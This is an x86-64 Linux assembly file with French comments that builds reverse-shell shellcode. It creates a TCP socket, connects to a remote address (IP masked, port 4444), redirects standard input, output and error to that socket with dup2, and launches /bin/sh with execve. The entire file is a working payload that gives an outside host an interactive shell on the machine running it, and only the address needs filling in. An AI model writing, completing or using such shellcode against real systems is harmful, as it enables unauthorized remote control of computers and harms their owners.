global _start

section .text
_start:

;socket parametre : inet : IPv4, sock stream = 1, 0
mov rax, 0x29   ; syscall socket
mov rdi, 2      ; inet en IPv4
mov rsi, 1      ; sock stream pour tcp
mov rdx, 0      ; protocol = 0 le noyau chosiit auto tcp
syscall

mov r12, rax    ; sauvegarde dans r12 pour eviter l'ecrasement des autres syscall 

; sockaddr 
xor rbx, rbx    ; remise a zero de rbx
push rbx        ; padding de 8
mov rbx, 0x????????      ; @ ip machine little indian
push rbx
mov rbx, 0x115c????
push rbx
mov rsi,rsp     ; rsi = pointeur vers sockaddr

;connect
mov rax, 0x2a   ; syscall connect
mov rdi, r12    ; récuperation du sockfd depuis r12 
mov rdx, 16     ; octet à lire par le noyau
syscall

;dup2 stdin, stdout, stderr

;stdin
mov rax, 0x21
mov rdi, r12   ; connexion au socket
xor rsi, rsi   ; stdin : rsi = 0
syscall

;stdout
mov rax, 0x21
mov rdi, r12    ; connexion au socket
mov rsi, 1      ; stdout : rsi = 1
syscall

;stderr
mov rax, 0x21
mov rdi, r12    ; oldfd connexion au socket
mov rsi, 2      ; stderr : rsi = 2 (newfd)
syscall

;execve : /bin/sh, (/bin/sh,null), null
xor rdx,rdx     ; envp = 0 pas de variable d'environnement
push rdx        ; null qui determine le tableau argv[]
mov rbx, 0x68732f6e69622f   ; /bin/sh en little indian tjr 
push rbx        
mov rdi, rsp    ; rdi = /bin/sh
push rdx        ; argv[1] = null
push rdi        ; argv[0] = /bin/sh
mov rsi, rsp    ; rsi = argv 
mov rax, 0x3b   ; syscall execve
syscall
